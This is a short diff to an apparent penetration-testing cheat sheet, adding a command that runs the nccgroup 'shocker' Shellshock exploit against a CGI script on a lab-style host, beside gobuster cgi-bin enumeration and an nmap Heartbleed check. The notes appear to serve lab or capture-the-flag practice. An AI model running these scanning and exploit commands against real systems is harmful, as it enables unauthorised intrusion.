@@ -26,6 +26,8 @@ http://localhost:8080/cgi-bin/vulnerable
 https://exploit-db.com/exploits/34900/
 #find cgi vulnerable 
 gobuster dir --url http://[IP]/cgi-bin/ -w /usr/share/dirb/wordlists/common.txt -t 30 -x .php,.sh,.html
+#exploit https://www.github.com/nccgroup/shocker
+/usr/bin/python2.7 shocker.py --cgi user.sh(vuln cgi) -H 10.10.10.56
 
 # heartbleed check
 nmap -sV -script=ssl-heartbleed [host]
